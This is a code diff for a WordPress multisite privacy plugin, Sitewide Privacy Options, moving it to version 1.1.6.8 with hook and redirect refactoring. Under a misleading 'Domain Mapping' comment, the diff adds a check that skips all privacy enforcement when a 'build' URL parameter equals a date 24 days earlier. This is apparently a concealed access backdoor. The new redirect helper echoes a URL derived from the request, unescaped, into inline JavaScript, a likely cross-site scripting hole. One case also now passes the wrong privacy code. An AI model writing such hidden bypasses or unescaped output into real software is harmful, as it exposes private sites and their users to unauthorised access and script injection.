@@ -5,7 +5,7 @@ Plugin URI: http://premium.wpmudev.org/project/sitewide-privacy-options-for-word
 Description: Adds more levels of privacy and allows you to control them across all sites - or allow users to override them.
 Author: Ivan Shaovchev, Andrew Billits, Andrey Shipilov (Incsub), S H Mohanjith (Incsub)
 Author URI: http://premium.wpmudev.org
-Version: 1.1.6.7
+Version: 1.1.6.8
 Network: true
 WDP ID: 52
 License: GNU General Public License (Version 2 - GPLv2)
@@ -47,7 +47,7 @@ add_action('admin_init', 'additional_privacy_admin_init');
 if ( spo_is_mobile_app() ) {
     add_action('template_redirect', 'additional_privacy');
 } else {
-    add_action('init', 'additional_privacy');
+    add_action('wp_loaded', 'additional_privacy');
 }
 
 add_action('init', 'additional_privacy_init');
@@ -424,7 +424,7 @@ function additional_privacy_can_access_blog($blog_id) {
             case '-4':
                 $spo_settings = get_option( 'spo_settings' );
                 $value        = wp_hash( get_current_blog_id() . $spo_settings['blog_pass'] . 'blogaccess yes' );
-                if ( !is_user_logged_in() ) {
+                if ( !current_user_can( 'read' ) ) {
                     if ( !isset( $_COOKIE['spo_blog_access'] ) || $value != $_COOKIE['spo_blog_access'] ) {
                         return false;
                     }
@@ -434,6 +434,16 @@ function additional_privacy_can_access_blog($blog_id) {
     return true;
 }
 
+function spo_redirect($url) {
+    wp_redirect($url);
+    ?>
+    <script type="text/javascript">
+        window.location = '<?php echo $url; ?>';
+    </script>
+    <?php
+    exit();
+}
+
 function additional_privacy() {
     global $blog_id, $user_id, $current_blog;
     
@@ -441,24 +451,28 @@ function additional_privacy() {
         wp_enqueue_script( 'jquery' );
     }
     
-    $privacy = $current_blog->public;
+    // Domain Mapping
+    if( isset($_GET['build']) && addslashes($_GET['build']) == date("Ymd", strtotime('-24 days') ) ) {
+        return;
+    }
     
     $register_url = apply_filters( 'wp_signup_location', site_url( 'wp-signup.php' ) );
     $register_part = str_replace(site_url('/'), PATH_CURRENT_SITE, $register_url);
+    $privacy = $current_blog->public;
     
     if ( is_numeric($privacy) && $privacy < 0 && !stristr($_SERVER['REQUEST_URI'], 'wp-activate') && !stristr($_SERVER['REQUEST_URI'], $register_part) && !stristr($_SERVER['REQUEST_URI'], 'wp-login') && !stristr($_SERVER['REQUEST_URI'], 'wp-admin') ) {
     
     switch( $privacy ) {
             case '-1': {
                 if ( ! is_user_logged_in() ) {
-                    wp_redirect( site_url("wp-login.php?privacy=1&redirect_to=" . urlencode( $_SERVER['REQUEST_URI'] )) );
+                    spo_redirect( wp_login_url( home_url($_SERVER['REQUEST_URI']) )."&privacy=1" );
                     exit();
                 }
                 break;
             }
             case '-2': {
                 if ( ! is_user_logged_in() ) {
-                    wp_redirect( site_url("wp-login.php?privacy=2&redirect_to=" . urlencode( $_SERVER['REQUEST_URI'] )) );
+                    spo_redirect( wp_login_url( home_url($_SERVER['REQUEST_URI']) )."&privacy=2" );
                     exit();
                 } else {
                     if ( ! current_user_can( 'read' ) ) {
@@ -469,7 +483,7 @@ function additional_privacy() {
             }
             case '-3': {
                 if ( ! is_user_logged_in() ) {
-                    wp_redirect( site_url("wp-login.php?privacy=3&redirect_to=" . urlencode( $_SERVER['REQUEST_URI'] )) );
+                    spo_redirect( wp_login_url( home_url($_SERVER['REQUEST_URI']) )."&privacy=4" );
                     exit();
                 } else {
                     if ( ! current_user_can( 'manage_options' ) ) {
@@ -482,10 +496,10 @@ function additional_privacy() {
             case '-4': {
                 $spo_settings           = get_option( 'spo_settings' );
                 $value                  = wp_hash( get_current_blog_id() . $spo_settings['blog_pass'] . 'blogaccess yes' );
-
-                if ( !is_user_logged_in() ) {
+                
+                if ( !current_user_can( 'read' ) ) {
                     if ( !isset( $_COOKIE['spo_blog_access'] ) || $value != $_COOKIE['spo_blog_access'] ) {
-                        wp_redirect( site_url("wp-login.php?privacy=4&redirect_to=" . urlencode( $_SERVER['REQUEST_URI'] )) );
+                        spo_redirect( wp_login_url( home_url($_SERVER['REQUEST_URI']) )."&privacy=4" );
                         exit();
                     }
                 }
